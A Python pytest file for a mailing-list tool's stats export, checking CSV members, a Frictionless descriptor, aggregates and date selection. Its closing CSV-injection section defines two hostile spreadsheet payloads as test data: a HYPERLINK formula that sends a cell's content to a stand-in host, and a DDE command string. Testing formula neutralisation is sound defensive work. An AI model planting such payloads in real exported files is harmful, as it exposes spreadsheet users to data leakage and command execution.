"""Tests for the stats export (:mod:`mailing_list_ai_check.stats_export`).

Written against ``docs/stats-export.md``: a zip archive of five members —
``messages.csv`` (one row per message in scope, scored or not), the ``lists.csv``
aggregate over the identical scope, the two-column ``senders.csv`` grouping, the
Frictionless Data Package descriptor ``datapackage.json`` and a data-dictionary
``README.md``.

The archive is an analysis artifact: nothing reads it back, so the assertions
here are what an analyst would check. The list aggregates are recomputed from
``messages.csv`` and compared with the aggregate member, the row counts with the
descriptor, and the selected messages with the full export's for the same range.
The descriptor is checked against the files it describes — its resource paths
against the members, its declared fields against each header row, its keys and
its enum vocabularies against the values the columns hold — and a real export is
validated against the ``frictionless`` tool itself in local verification rather
than as a test dependency.

Fixtures are built through the public :class:`Store` API. The source database
covers: two lists; a person posting from two addresses; two unlinked addresses,
one of them never extracted; an address with no message at all; a message with no
sender address; a reply whose parent is in the export and one whose parent is
not; extractions that are scored, unscored and gated under the reliability
floor; two detector versions and two extraction generations.
"""

from __future__ import annotations

import csv
import io
import json
import re
import zipfile
from datetime import datetime
from pathlib import Path

import pytest

from mailing_list_ai_check import __version__, codec, export_import, stats_export
from mailing_list_ai_check.cli import stats_export_main
from email_reply_extractor.extraction import EXTRACTION_VERSION
from mailing_list_ai_check.stats_export import (
    DATAPACKAGE_MEMBER,
    DATAPACKAGE_PROFILE,
    LABELS,
    LISTS_MEMBER,
    MESSAGES_MEMBER,
    README_MEMBER,
    SENDERS_MEMBER,
    STATS_FORMAT_NAME,
    STATS_FORMAT_VERSION,
    TIMING_BANDS,
    export_stats,
)
from mailing_list_ai_check.store import EXTRACTION_STATUSES, Store, ai_share, sha256_text

# --- fixture data -------------------------------------------------------------

ANNOUNCE = "Shared Folders/announce"
LAST_CALL = "Shared Folders/last-call"

# Message natural keys, in the order they are inserted and therefore emitted.
M1 = "<m1@example.org>"  # announce, Alice (person), scored AI
M2 = "<m2@example.org>"  # announce, Bob, reply to M1, scored Human
M3 = "<m3@example.org>"  # announce, no sender address, extracted but unscored
M4 = "<m4@example.org>"  # announce, Carol, auto-generated, never extracted
M5 = "<m5@example.org>"  # announce, Alice's second address, too_short
M6 = "<m6@example.org>"  # last-call, Alice, reply to a parent outside the export

# In-Reply-To as it can arrive: surrounded by whitespace and trailing CFWS. The
# column carries the stored value verbatim, tokens and all.
M2_IN_REPLY_TO = f"  {M1} (the original)"
OUTSIDE = "<outside@example.org>"


def _build_source(store: Store) -> dict[str, int]:
    """Populate ``store`` with the stats fixture; return the ids tests need."""
    announce = store.upsert_list("announce", ANNOUNCE)
    last_call = store.upsert_list("last-call", LAST_CALL)

    person = store.create_person("Alice Smith")
    alice = store.upsert_address("alice@example.org", "Alice Smith")
    alice_work = store.upsert_address("alice@work.example", "Alice Smith")
    bob = store.upsert_address("bob@example.org", "Bob Jones")
    carol = store.upsert_address("carol@example.org", "Carol")
    store.upsert_address("dave@example.org", "Dave")  # no messages -> not a sender
    store.assign_address_to_person(alice.id, person.id)
    store.assign_address_to_person(alice_work.id, person.id)

    m1 = store.upsert_message(
        message_id=M1,
        list_id=announce.id,
        address_id=alice.id,
        subject="Intro",
        date="2026-01-05T10:00:00+00:00",
        in_reply_to=None,
        raw_body="Body one",
        uid=101,
        # Deliberately not the address's "Alice Smith": the per-message From name
        # is what the sender_name column reports when there is one.
        from_name="Alice A. Smith",
    ).message
    e1 = store.insert_extraction(
        message_id=m1.id,
        extracted_text="Body one, extracted",
        method="reply_parser",
        status="ok",
        created_at="2026-01-06T01:00:00+00:00",
    )
    store.insert_score(
        extraction_id=e1.id,
        text_sha256=sha256_text("cleaned one"),
        fraction_ai=0.95,
        fraction_ai_assisted=0.03,
        fraction_human=0.02,
        label="AI",
        detector_version="3.3.2",
        raw_response={"prediction_short": "AI"},
        scored_at="2026-01-07T00:00:00+00:00",
    )

    m2 = store.upsert_message(
        message_id=M2,
        list_id=announce.id,
        address_id=bob.id,
        subject="Re: Intro",
        date="2026-01-10T10:00:00+00:00",
        in_reply_to=M2_IN_REPLY_TO,
        raw_body="Body two",
        uid=102,
    ).message
    e2 = store.insert_extraction(
        message_id=m2.id,
        extracted_text="Body two, extracted",
        method="reply_parser",
        status="ok",
        created_at="2026-01-11T01:00:00+00:00",
    )
    store.insert_score(
        extraction_id=e2.id,
        text_sha256=sha256_text("cleaned two"),
        fraction_ai=0.02,
        fraction_ai_assisted=0.01,
        fraction_human=0.97,
        label="Human",
        detector_version="4.0.0",
        raw_response=None,
        scored_at="2026-01-12T00:00:00+00:00",
    )

    m3 = store.upsert_message(
        message_id=M3,
        list_id=announce.id,
        address_id=None,
        subject="No sender",
        date="2026-01-15T10:00:00+00:00",
        in_reply_to=None,
        raw_body="Body three",
        uid=103,
    ).message
    store.insert_extraction(
        message_id=m3.id,
        extracted_text="Body three, extracted",
        method="custom",
        status="ok",
        created_at="2026-01-16T01:00:00+00:00",
    )

    store.upsert_message(
        message_id=M4,
        list_id=announce.id,
        address_id=carol.id,
        subject="Automated notice",
        date="2026-01-20T10:00:00+00:00",
        in_reply_to=None,
        raw_body="Body four",
        uid=104,
        auto_generated="auto-submitted",
    )

    m5 = store.upsert_message(
        message_id=M5,
        list_id=announce.id,
        address_id=alice_work.id,
        subject="Short note",
        date="2026-01-25T10:00:00+00:00",
        in_reply_to=None,
        raw_body="Body five",
        uid=105,
    ).message
    store.insert_extraction(
        message_id=m5.id,
        extracted_text="tiny",
        method="reply_parser",
        status="too_short",
        created_at="2026-01-26T01:00:00+00:00",
        # An older generation, so the file carries two of them.
        extraction_version=1,
    )

    m6 = store.upsert_message(
        message_id=M6,
        list_id=last_call.id,
        address_id=alice.id,
        subject="Re: something else",
        date="2026-02-01T10:00:00+00:00",
        in_reply_to=OUTSIDE,
        raw_body="Body six",
        uid=201,
    ).message
    e6 = store.insert_extraction(
        message_id=m6.id,
        extracted_text="Body six, extracted",
        method="reply_parser",
        status="ok",
        created_at="2026-02-02T01:00:00+00:00",
    )
    store.insert_score(
        extraction_id=e6.id,
        text_sha256=sha256_text("cleaned six"),
        fraction_ai=0.55,
        fraction_ai_assisted=0.30,
        fraction_human=0.15,
        label="Mixed",
        detector_version="4.0.0",
        raw_response=None,
        scored_at="2026-02-03T00:00:00+00:00",
    )

    # The timing columns are derived, not written per message: M2 is the only
    # reply whose parent is stored, so it is the only row with a band.
    store.recompute_timing()

    return {
        "person": person.id,
        "announce": announce.id,
        "last_call": last_call.id,
        "alice": alice.id,
        "alice_work": alice_work.id,
        "bob": bob.id,
        "carol": carol.id,
    }


@pytest.fixture
def source():
    """An in-memory Store populated with the stats fixture."""
    with Store(":memory:") as s:
        s.ids = _build_source(s)  # type: ignore[attr-defined]
        yield s


# --- archive helpers ------------------------------------------------------------


def _export(store: Store, tmp_path: Path, name: str = "stats", **kwargs) -> Path:
    """Export every list unless ``kwargs`` says otherwise; return the path written."""
    kwargs.setdefault("all_lists", True)
    list_names = kwargs.pop("list_names", None)
    summary = export_stats(store, list_names, tmp_path / name, **kwargs)
    return Path(summary.path)


def _member_bytes(path: Path, member: str) -> bytes:
    with zipfile.ZipFile(path) as archive:
        return archive.read(member)


def _rows(path: Path, member: str) -> list[dict[str, str]]:
    """Read one CSV member with the stdlib reader, as a consumer would."""
    text = io.StringIO(_member_bytes(path, member).decode("utf-8"), newline="")
    return list(csv.DictReader(text))


def _columns(path: Path, member: str) -> list[str]:
    text = io.StringIO(_member_bytes(path, member).decode("utf-8"), newline="")
    return next(csv.reader(text))


def _datapackage(path: Path) -> dict:
    """The archive's descriptor, parsed."""
    return json.loads(_member_bytes(path, DATAPACKAGE_MEMBER).decode("utf-8"))


def _mlac(path: Path) -> dict:
    """The descriptor's custom provenance object."""
    return _datapackage(path)["mlac"]


def _resources(path: Path) -> dict[str, dict]:
    """The descriptor's resources, keyed by resource name."""
    return {resource["name"]: resource for resource in _datapackage(path)["resources"]}


def _by_message_id(rows: list[dict[str, str]]) -> dict[str, dict[str, str]]:
    """The message rows keyed by ``message_id``, for a scope with no cross-post."""
    return {row["message_id"]: row for row in rows}


def _recomputed(rows: list[dict[str, str]], column: str) -> dict[str, dict[str, object]]:
    """The aggregates ``lists.csv`` holds, recomputed from the message rows.

    Grouped by ``column`` (``folder``), counting exactly what the spec defines
    each aggregate column to be, so a mismatch is a bug in the export rather than
    a restatement of its own arithmetic.
    """
    groups: dict[str, dict[str, object]] = {}
    for row in rows:
        key = row[column]
        group = groups.setdefault(
            key,
            {"messages": 0, "scored": 0, "too_short": 0, "human": 0, "mixed": 0, "ai": 0},
        )
        group["messages"] += 1
        if row["label"]:
            group["scored"] += 1
            group[row["label"].lower()] += 1
        if row["extraction_status"] == "too_short":
            group["too_short"] += 1
        dates = [d for d in (group.get("first_date"), row["date"]) if d]
        group["first_date"] = min(dates) if dates else ""
        dates = [d for d in (group.get("last_date"), row["date"]) if d]
        group["last_date"] = max(dates) if dates else ""
    return groups


def _as_counts(row: dict[str, str]) -> dict[str, object]:
    """One aggregate CSV row as the shape :func:`_recomputed` produces."""
    counts: dict[str, object] = {
        name: int(row[name]) for name in ("messages", "scored", "too_short", "human", "mixed", "ai")
    }
    counts["first_date"] = row["first_date"]
    counts["last_date"] = row["last_date"]
    return counts


# ==============================================================================
# ARCHIVE SHAPE
# ==============================================================================


def test_archive_holds_exactly_the_five_members(source, tmp_path):
    path = _export(source, tmp_path)
    with zipfile.ZipFile(path) as archive:
        assert set(archive.namelist()) == {
            MESSAGES_MEMBER,
            LISTS_MEMBER,
            SENDERS_MEMBER,
            DATAPACKAGE_MEMBER,
            README_MEMBER,
        }


def test_zip_suffix_is_appended_once(source, tmp_path):
    """The summary reports the path actually written, whatever it was handed."""
    plain = export_stats(source, None, tmp_path / "stats", all_lists=True)
    already = export_stats(source, None, tmp_path / "other.zip", all_lists=True)
    assert plain.path == str(tmp_path / "stats.zip")
    assert already.path == str(tmp_path / "other.zip")
    assert Path(plain.path).exists() and Path(already.path).exists()


def test_summary_counts_the_export(source, tmp_path):
    """``senders`` is the senders.csv row count: four addresses, three senders."""
    summary = export_stats(source, None, tmp_path / "stats", all_lists=True)
    assert (summary.lists, summary.senders, summary.messages, summary.scored) == (2, 4, 6, 3)
    assert summary.as_line().startswith("lists=2 senders=4 messages=6 scored=3 path=")


def test_datapackage_declares_the_v2_profile_and_the_package_identity(source, tmp_path):
    """A standard descriptor: the profile, the package name, a title and a date."""
    path = _export(source, tmp_path)
    descriptor = _datapackage(path)
    assert (
        descriptor["$schema"]
        == DATAPACKAGE_PROFILE
        == ("https://datapackage.org/profiles/2.0/datapackage.json")
    )
    assert descriptor["name"] == STATS_FORMAT_NAME == "mlac-stats"
    assert descriptor["title"] and descriptor["description"]
    # An ISO-8601 UTC instant, parseable without help.
    assert datetime.fromisoformat(descriptor["created"]).tzinfo is not None


def test_datapackage_resources_name_the_archive_members(source, tmp_path):
    """Three tabular resources, each pointing at the member it describes."""
    path = _export(source, tmp_path)
    resources = _resources(path)
    assert list(resources) == ["messages", "lists", "senders"]
    assert {name: resource["path"] for name, resource in resources.items()} == {
        "messages": MESSAGES_MEMBER,
        "lists": LISTS_MEMBER,
        "senders": SENDERS_MEMBER,
    }
    for resource in resources.values():
        assert (resource["format"], resource["mediatype"], resource["encoding"]) == (
            "csv",
            "text/csv",
            "utf-8",
        )


def test_datapackage_fields_are_each_members_header_row(source, tmp_path):
    """The declared schema and the file cannot disagree about columns or order."""
    path = _export(source, tmp_path)
    for name, member in (
        ("messages", MESSAGES_MEMBER),
        ("lists", LISTS_MEMBER),
        ("senders", SENDERS_MEMBER),
    ):
        fields = _resources(path)[name]["schema"]["fields"]
        assert [field["name"] for field in fields] == _columns(path, member)
        # Every field is typed and documented, so the schema stands alone.
        for field in fields:
            assert field["type"] in {"string", "integer", "number", "datetime"}
            assert field["description"]


def test_datapackage_types_the_columns_by_what_they_hold(source, tmp_path):
    path = _export(source, tmp_path)
    schemas = {name: resource["schema"] for name, resource in _resources(path).items()}
    types = {
        member: {field["name"]: field["type"] for field in schema["fields"]}
        for member, schema in schemas.items()
    }
    assert types["messages"]["message_id"] == types["messages"]["email"] == "string"
    assert types["messages"]["date"] == types["messages"]["scored_at"] == "datetime"
    assert types["messages"]["extraction_chars"] == "integer"
    assert types["messages"]["extraction_version"] == "integer"
    assert types["messages"]["timing_cpm"] == "number"
    assert types["messages"]["fraction_ai"] == "number"
    # A version string stays a string: "1.10.3" is not a number.
    assert types["messages"]["pipeline_version"] == "string"
    assert types["lists"]["messages"] == types["lists"]["ai"] == "integer"
    assert types["lists"]["ai_share"] == "number"
    assert types["lists"]["first_date"] == types["lists"]["last_date"] == "datetime"


def test_datapackage_constrains_the_fractions_to_the_unit_interval(source, tmp_path):
    path = _export(source, tmp_path)
    fields = {field["name"]: field for field in _resources(path)["messages"]["schema"]["fields"]}
    for name in ("fraction_ai", "fraction_ai_assisted", "fraction_human"):
        assert fields[name]["constraints"] == {"minimum": 0, "maximum": 1}


def test_datapackage_enums_are_the_stores_vocabularies(source, tmp_path):
    """The closed sets come from the app's own constants, not from the rows present."""
    path = _export(source, tmp_path)
    fields = {field["name"]: field for field in _resources(path)["messages"]["schema"]["fields"]}
    assert fields["label"]["constraints"]["enum"] == list(LABELS) == ["Human", "Mixed", "AI"]
    assert fields["timing"]["constraints"]["enum"] == list(TIMING_BANDS)
    assert fields["extraction_status"]["constraints"]["enum"] == list(EXTRACTION_STATUSES)
    # Every value the file actually holds is in the vocabulary it declares.
    for row in _rows(path, MESSAGES_MEMBER):
        for column, vocabulary in (
            ("label", LABELS),
            ("timing", TIMING_BANDS),
            ("extraction_status", EXTRACTION_STATUSES),
        ):
            assert row[column] == "" or row[column] in vocabulary


def test_datapackage_states_the_keys_and_the_joins(source, tmp_path):
    path = _export(source, tmp_path)
    schemas = {name: resource["schema"] for name, resource in _resources(path).items()}
    assert schemas["messages"]["primaryKey"] == ["folder", "message_id"]
    assert schemas["lists"]["primaryKey"] == ["folder"]
    assert schemas["senders"]["primaryKey"] == ["email"]
    assert schemas["messages"]["foreignKeys"] == [
        {"fields": ["folder"], "reference": {"resource": "lists", "fields": ["folder"]}},
        {"fields": ["email"], "reference": {"resource": "senders", "fields": ["email"]}},
    ]
    # The aggregate and grouping members declare no join of their own.
    assert "foreignKeys" not in schemas["lists"]
    assert "foreignKeys" not in schemas["senders"]


def test_datapackage_keys_hold_over_the_rows_they_describe(source, tmp_path):
    """What the descriptor asserts is true of the files: unique keys, resolved joins."""
    path = _export(source, tmp_path)
    messages = _rows(path, MESSAGES_MEMBER)
    pairs = [(row["folder"], row["message_id"]) for row in messages]
    assert len(set(pairs)) == len(pairs)
    folders = [row["folder"] for row in _rows(path, LISTS_MEMBER)]
    assert len(set(folders)) == len(folders)
    emails = [row["email"] for row in _rows(path, SENDERS_MEMBER)]
    assert len(set(emails)) == len(emails)
    assert {row["folder"] for row in messages} <= set(folders)
    # A missing sender address is an empty field, which no join has to resolve.
    assert {row["email"] for row in messages if row["email"]} <= set(emails)


def test_datapackage_rows_match_the_csv_row_counts(source, tmp_path):
    path = _export(source, tmp_path)
    mlac = _mlac(path)
    assert mlac["rows"] == {
        "messages": len(_rows(path, MESSAGES_MEMBER)),
        "lists": len(_rows(path, LISTS_MEMBER)),
        "senders": len(_rows(path, SENDERS_MEMBER)),
    }
    # senders counts addresses, not the distinct keys they group into.
    assert mlac["rows"] == {"messages": 6, "lists": 2, "senders": 4}


def test_mlac_records_provenance_and_the_values_present(source, tmp_path):
    path = _export(source, tmp_path)
    mlac = _mlac(path)
    assert mlac["stats_format_version"] == STATS_FORMAT_VERSION == 2
    assert mlac["app_version"] == __version__
    assert mlac["schema_version"] > 0
    assert mlac["folders"] == [ANNOUNCE, LAST_CALL]
    # Only the versions actually present in the file, not everything the app knows.
    assert mlac["detector_versions"] == ["3.3.2", "4.0.0"]
    assert mlac["extraction_versions"] == [1, EXTRACTION_VERSION]
    assert "date_from" not in mlac and "date_to" not in mlac
    # The single-variant format states no identity flag.
    assert "identified" not in mlac
    # The vocabularies are schema constraints now, not provenance.
    assert "labels" not in mlac and "timing_bands" not in mlac


def test_mlac_records_the_range_only_when_bounded(source, tmp_path):
    path = _export(source, tmp_path, date_from="2026-01-15", date_to="2026-02-01T23:59:59+00:00")
    mlac = _mlac(path)
    assert mlac["date_from"] == "2026-01-15"
    assert mlac["date_to"] == "2026-02-01T23:59:59+00:00"


def test_csv_conventions(source, tmp_path):
    """UTF-8, a header row, ``\\n`` line endings, NULL as an empty field."""
    path = _export(source, tmp_path)
    raw = _member_bytes(path, MESSAGES_MEMBER)
    assert b"\r\n" not in raw
    assert raw.endswith(b"\n")
    assert raw.decode("utf-8").splitlines()[0].startswith("message_id,list,folder,date,email")

    rows = _by_message_id(_rows(path, MESSAGES_MEMBER))
    # Never extracted, never scored: every derived column is empty, not "None".
    assert rows[M4]["label"] == ""
    assert rows[M4]["extraction_status"] == ""
    assert rows[M4]["fraction_ai"] == ""


def test_message_columns_are_the_spec_order(source, tmp_path):
    """Column order is part of the format, and holds no surrogate key."""
    path = _export(source, tmp_path)
    assert _columns(path, MESSAGES_MEMBER) == [
        "message_id",
        "list",
        "folder",
        "date",
        "email",
        "sender_name",
        "in_reply_to",
        "auto_generated",
        "timing",
        "timing_cpm",
        "extraction_status",
        "extraction_method",
        "extraction_chars",
        "extraction_version",
        "pipeline_version",
        "label",
        "fraction_ai",
        "fraction_ai_assisted",
        "fraction_human",
        "detector_version",
        "scored_at",
    ]


def test_readme_documents_every_column_it_ships(source, tmp_path):
    path = _export(source, tmp_path)
    readme = _member_bytes(path, README_MEMBER).decode("utf-8")
    for member in (MESSAGES_MEMBER, LISTS_MEMBER, SENDERS_MEMBER):
        for column in _columns(path, member):
            assert f"`{column}`" in readme, f"{member}.{column} is undocumented"


def test_readme_explains_the_descriptor(source, tmp_path):
    """It names the standard, the command that checks the files, and the provenance."""
    path = _export(source, tmp_path)
    readme = _member_bytes(path, README_MEMBER).decode("utf-8")
    assert "Frictionless Data" in readme
    assert f"frictionless validate {DATAPACKAGE_MEMBER}" in readme
    assert "`mlac`" in readme


def test_readme_carries_the_interpretation_caveats(source, tmp_path):
    path = _export(source, tmp_path)
    readme = _member_bytes(path, README_MEMBER).decode("utf-8")
    assert "`(folder, message_id)` is unique" in readme
    assert "not a unique key" in readme
    assert "normalising" in readme
    assert "too-short" in readme


# ==============================================================================
# messages.csv
# ==============================================================================


def test_messages_csv_holds_every_message_in_scope(source, tmp_path):
    """Unscored and gated messages are rows too: a share needs its denominator."""
    path = _export(source, tmp_path)
    rows = _rows(path, MESSAGES_MEMBER)
    stored = source.conn.execute("SELECT COUNT(*) AS c FROM messages").fetchone()["c"]
    assert len(rows) == stored == 6
    assert [row["message_id"] for row in rows] == [M1, M2, M3, M4, M5, M6]


def test_message_rows_equal_the_stored_values(source, tmp_path):
    path = _export(source, tmp_path)
    rows = _rows(path, MESSAGES_MEMBER)

    stored = source.conn.execute(
        "SELECT l.name AS list, l.folder AS folder, m.message_id AS message_id, "
        "m.date AS date, m.in_reply_to AS in_reply_to, m.auto_generated AS auto_generated, "
        "m.timing AS timing, m.pipeline_version AS pipeline_version, "
        "e.status AS status, e.method AS method, e.char_count AS char_count, "
        "e.extraction_version AS extraction_version, sc.label AS label, "
        "sc.fraction_ai AS fraction_ai, sc.detector_version AS detector_version, "
        "sc.scored_at AS scored_at "
        "FROM messages m JOIN lists l ON l.id = m.list_id "
        "LEFT JOIN extractions e ON e.message_id = m.id "
        "LEFT JOIN scores sc ON sc.extraction_id = e.id ORDER BY m.list_id, m.id"
    ).fetchall()

    def blank(value):
        return "" if value is None else str(value)

    for row, want in zip(rows, stored, strict=True):
        assert row["list"] == want["list"]
        assert row["folder"] == want["folder"]
        assert row["message_id"] == want["message_id"]
        assert row["date"] == blank(want["date"])
        assert row["in_reply_to"] == blank(want["in_reply_to"])
        assert row["auto_generated"] == blank(want["auto_generated"])
        assert row["timing"] == blank(want["timing"])
        assert row["pipeline_version"] == blank(want["pipeline_version"])
        assert row["extraction_status"] == blank(want["status"])
        assert row["extraction_method"] == blank(want["method"])
        assert row["extraction_chars"] == blank(want["char_count"])
        assert row["extraction_version"] == blank(want["extraction_version"])
        assert row["label"] == blank(want["label"])
        assert row["fraction_ai"] == blank(want["fraction_ai"])
        assert row["detector_version"] == blank(want["detector_version"])
        assert row["scored_at"] == blank(want["scored_at"])


def test_fractions_keep_their_stored_precision(source, tmp_path):
    """A third written unrounded, so a consumer's own rounding is the only one."""
    source.conn.execute("UPDATE scores SET fraction_ai = ? WHERE id = 1", (1 / 3,))
    source.conn.commit()
    path = _export(source, tmp_path)
    assert float(_by_message_id(_rows(path, MESSAGES_MEMBER))[M1]["fraction_ai"]) == 1 / 3


def test_sender_columns_name_the_address_and_the_from_name(source, tmp_path):
    path = _export(source, tmp_path)
    rows = _by_message_id(_rows(path, MESSAGES_MEMBER))
    # The message's own From name wins over the address's display name.
    assert (rows[M1]["email"], rows[M1]["sender_name"]) == ("alice@example.org", "Alice A. Smith")
    # With no From name of its own, the address's display name is reported.
    assert (rows[M2]["email"], rows[M2]["sender_name"]) == ("bob@example.org", "Bob Jones")


def test_a_message_with_no_sender_has_an_empty_email_and_no_sender_row(source, tmp_path):
    path = _export(source, tmp_path)
    rows = _by_message_id(_rows(path, MESSAGES_MEMBER))
    assert (rows[M3]["email"], rows[M3]["sender_name"]) == ("", "")
    # It is counted in the list aggregate and under no sender.
    emails = {row["email"] for row in _rows(path, SENDERS_MEMBER)}
    assert "" not in emails
    assert sum(int(row["messages"]) for row in _rows(path, LISTS_MEMBER)) == 6


def test_timing_columns_come_from_the_stored_bands(source, tmp_path):
    path = _export(source, tmp_path)
    rows = _by_message_id(_rows(path, MESSAGES_MEMBER))
    # M2 is the only reply whose parent is stored, so the only timed message.
    assert rows[M2]["timing"] == "normal"
    assert float(rows[M2]["timing_cpm"]) > 0
    # Empty band and empty rate, together: neither is reported without the other.
    assert (rows[M1]["timing"], rows[M1]["timing_cpm"]) == ("", "")


def test_in_reply_to_is_the_stored_value(source, tmp_path):
    """The header verbatim, tokens and all: normalising it is the analyst's job."""
    path = _export(source, tmp_path)
    rows = _by_message_id(_rows(path, MESSAGES_MEMBER))
    assert rows[M2]["in_reply_to"] == M2_IN_REPLY_TO
    assert M1 in rows[M2]["in_reply_to"]
    # A reply whose parent is outside the export still carries its header.
    assert rows[M6]["in_reply_to"] == OUTSIDE
    # A message that is not a reply has an empty field.
    assert rows[M1]["in_reply_to"] == ""


def test_a_range_that_excludes_the_parent_keeps_in_reply_to(source, tmp_path):
    path = _export(source, tmp_path, date_from="2026-01-08")
    reply = _by_message_id(_rows(path, MESSAGES_MEMBER))[M2]
    assert reply["in_reply_to"] == M2_IN_REPLY_TO
    # The parent it names is not in the file, so the thread join finds nothing.
    assert M1 not in {row["message_id"] for row in _rows(path, MESSAGES_MEMBER)}


def test_a_cross_posted_message_appears_once_per_list(source, tmp_path):
    """The same Message-ID on two lists: two rows, one per folder."""
    source.upsert_message(
        message_id=M1,
        list_id=source.ids["last_call"],
        address_id=source.ids["alice"],
        subject="Intro",
        date="2026-01-05T10:00:00+00:00",
        in_reply_to=None,
        raw_body="Body one",
        uid=202,
        from_name="Alice A. Smith",
    )
    path = _export(source, tmp_path)
    rows = _rows(path, MESSAGES_MEMBER)
    assert len(rows) == 7
    copies = [row for row in rows if row["message_id"] == M1]
    assert len(copies) == 2
    assert sorted(row["folder"] for row in copies) == [ANNOUNCE, LAST_CALL]
    # message_id is not unique, but (folder, message_id) is.
    pairs = [(row["folder"], row["message_id"]) for row in rows]
    assert len(set(pairs)) == len(pairs)
    # The copy on the other list is a message of that list, so the aggregate moves.
    aggregates = {row["folder"]: int(row["messages"]) for row in _rows(path, LISTS_MEMBER)}
    assert aggregates == {ANNOUNCE: 5, LAST_CALL: 2}
    # The address was already a sender, so senders.csv is unchanged.
    assert len(_rows(path, SENDERS_MEMBER)) == 4


# ==============================================================================
# lists.csv
# ==============================================================================


def test_list_aggregates_equal_the_message_rows(source, tmp_path):
    path = _export(source, tmp_path)
    recomputed = _recomputed(_rows(path, MESSAGES_MEMBER), "folder")
    rows = {row["folder"]: row for row in _rows(path, LISTS_MEMBER)}
    assert set(rows) == set(recomputed)
    for folder, row in rows.items():
        assert _as_counts(row) == recomputed[folder]
    # And the totals reach the primitive table.
    assert sum(int(row["messages"]) for row in rows.values()) == 6


def test_ai_share_matches_the_dashboard_definition(source, tmp_path):
    path = _export(source, tmp_path)
    for row in _rows(path, LISTS_MEMBER):
        counts = {label: int(row[label.lower()]) for label in ("Human", "Mixed", "AI")}
        too_short = int(row["too_short"])
        if int(row["scored"]) + too_short == 0:
            assert row["ai_share"] == ""
        else:
            assert float(row["ai_share"]) == ai_share(counts, too_short)
    announce = next(row for row in _rows(path, LISTS_MEMBER) if row["folder"] == ANNOUNCE)
    # 1 AI over 2 scored + 1 gated: the gated message is in the denominator.
    assert float(announce["ai_share"]) == 1 / 3


def test_a_named_list_with_nothing_in_range_is_a_zero_row(source, tmp_path):
    """The file says the list was asked for and held no message."""
    path = _export(
        source, tmp_path, list_names=["announce"], all_lists=False, date_from="2026-02-01"
    )
    rows = _rows(path, LISTS_MEMBER)
    assert len(rows) == 1
    assert rows[0]["folder"] == ANNOUNCE
    assert rows[0]["messages"] == "0"
    assert rows[0]["ai_share"] == ""
    assert (rows[0]["first_date"], rows[0]["last_date"]) == ("", "")
    assert _rows(path, MESSAGES_MEMBER) == []
    # No message, so no address, so no sender row either.
    assert _rows(path, SENDERS_MEMBER) == []


# ==============================================================================
# senders.csv
# ==============================================================================


def test_senders_csv_is_exactly_the_two_grouping_columns(source, tmp_path):
    """No aggregates, no name: the grouping and nothing else."""
    path = _export(source, tmp_path)
    assert _columns(path, SENDERS_MEMBER) == ["sender_key", "email"]


def test_senders_csv_covers_exactly_the_addresses_in_messages_csv(source, tmp_path):
    path = _export(source, tmp_path)
    first_seen: list[str] = []
    for row in _rows(path, MESSAGES_MEMBER):
        if row["email"] and row["email"] not in first_seen:
            first_seen.append(row["email"])
    rows = _rows(path, SENDERS_MEMBER)
    # One row per address, in the order the messages first name them.
    assert [row["email"] for row in rows] == first_seen
    assert len(rows) == 4
    # An address with no message in scope is not a sender at all.
    assert "dave@example.org" not in first_seen


def test_a_persons_addresses_share_one_dense_key(source, tmp_path):
    path = _export(source, tmp_path)
    keys = {row["email"]: row["sender_key"] for row in _rows(path, SENDERS_MEMBER)}
    # Alice's two addresses are one sender; the unlinked ones are their own.
    assert keys["alice@example.org"] == keys["alice@work.example"] == "s1"
    assert keys["bob@example.org"] == "s2"
    assert keys["carol@example.org"] == "s3"
    # Dense and assigned in first-seen message-emission order.
    assert sorted(set(keys.values())) == ["s1", "s2", "s3"]
    assert [row["sender_key"] for row in _rows(path, SENDERS_MEMBER)] == ["s1", "s2", "s3", "s1"]


def test_sender_keys_follow_the_selected_scope(source, tmp_path):
    """Keys are file-scoped: a narrower scope renumbers from s1."""
    path = _export(source, tmp_path, list_names=["last-call"], all_lists=False)
    rows = _rows(path, SENDERS_MEMBER)
    assert rows == [{"sender_key": "s1", "email": "alice@example.org"}]


# ==============================================================================
# SELECTION
# ==============================================================================


def test_named_lists_select_only_their_messages(source, tmp_path):
    path = _export(source, tmp_path, list_names=["last-call"], all_lists=False)
    assert [row["message_id"] for row in _rows(path, MESSAGES_MEMBER)] == [M6]
    assert _mlac(path)["folders"] == [LAST_CALL]


@pytest.mark.parametrize(
    ("names", "all_lists"),
    [(["announce"], True), (None, False)],
    ids=["both", "neither"],
)
def test_selection_needs_names_xor_all_lists(source, tmp_path, names, all_lists):
    with pytest.raises(ValueError):
        export_stats(source, names, tmp_path / "x", all_lists=all_lists)


def test_unknown_list_name_is_an_error(source, tmp_path):
    with pytest.raises(ValueError, match="unknown list name"):
        export_stats(source, ["nope"], tmp_path / "x")


def test_date_range_selects_the_same_messages_as_the_full_export(source, tmp_path):
    """The two exports share their selection, so their ranges cannot drift apart."""
    bounds = {"date_from": "2026-01-15", "date_to": "2026-02-01T23:59:59+00:00"}
    stats = _export(source, tmp_path, **bounds)
    full = export_import.export_lists(
        source, None, tmp_path / "full.jsonl", all_lists=True, **bounds
    )
    with codec.open_read_text(full.path) as fh:
        records = [json.loads(line) for line in fh if line.strip()]

    exported = {row["message_id"] for row in _rows(stats, MESSAGES_MEMBER)}
    assert exported == {r["message_id"] for r in records if r.get("type") == "message"}
    assert exported == {M3, M4, M5, M6}


def test_a_bare_date_to_excludes_that_days_messages(source, tmp_path):
    """The same lexical edge the full export and the dashboard filter have."""
    path = _export(source, tmp_path, date_to="2026-01-20")
    assert {row["message_id"] for row in _rows(path, MESSAGES_MEMBER)} == {M1, M2, M3}


def test_all_lists_skips_a_list_with_nothing_in_range(source, tmp_path):
    path = _export(source, tmp_path, date_to="2026-01-31")
    assert _mlac(path)["folders"] == [ANNOUNCE]
    assert [row["folder"] for row in _rows(path, LISTS_MEMBER)] == [ANNOUNCE]


# ==============================================================================
# Formula neutralisation (CSV injection)
# ==============================================================================

#: The reversal rule the archive README states, applied by a consumer.
_ESCAPED = re.compile(r"^'+[=+\-@\t\r]")


def _unescape(value: str) -> str:
    return value[1:] if _ESCAPED.match(value) else value


HOSTILE_NAME = '=HYPERLINK("http://x.example/?"&A1,"x")'
HOSTILE_CMD = "=cmd|'/c calc'!A1"


def _make_hostile(store: Store) -> None:
    """Rewrite fixture values into the shapes a third party can make them take."""
    conn = store.conn
    conn.execute("UPDATE messages SET from_name = ? WHERE message_id = ?", (HOSTILE_NAME, M1))
    conn.execute("UPDATE messages SET from_name = ? WHERE message_id = ?", (HOSTILE_CMD, M2))
